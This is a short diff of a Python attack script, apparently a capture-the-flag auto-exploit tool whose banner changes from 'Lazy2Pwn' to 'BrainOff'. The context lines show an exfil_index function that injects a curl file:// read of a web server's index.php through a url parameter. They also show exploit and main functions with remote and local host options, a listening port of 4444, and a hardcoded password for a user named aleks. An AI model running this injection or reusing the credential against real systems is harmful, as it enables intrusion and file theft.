@@ -8,7 +8,7 @@ import pyfiglet
 
 def generate_banner(text, font="standard"):
 	ascii_banner = pyfiglet.figlet_format(text, font=font)
-	print(ascii_banner + "				@Mohamed_Ezzat\n")
+	print(ascii_banner + "			@Mohamed_Ezzat\n")
 
 def exfil_index(rhost, lhost, lport):
 	data = f"url=http://{rhost}+curl+file:///var/www/html/index.php"
@@ -60,7 +60,7 @@ def exploit(rhost, lhost, lport):
 @click.option('--lport', default=4444, help='Enter local listening port')
 def main(rhost, lhost, lport):
 	aleks_pass = "1uY3w22uc-Wr{xNHR~+E"
-	generate_banner("Lazy2Pwn")
+	generate_banner("BrainOff")
 	print(f'''
 Walkthrough:
 
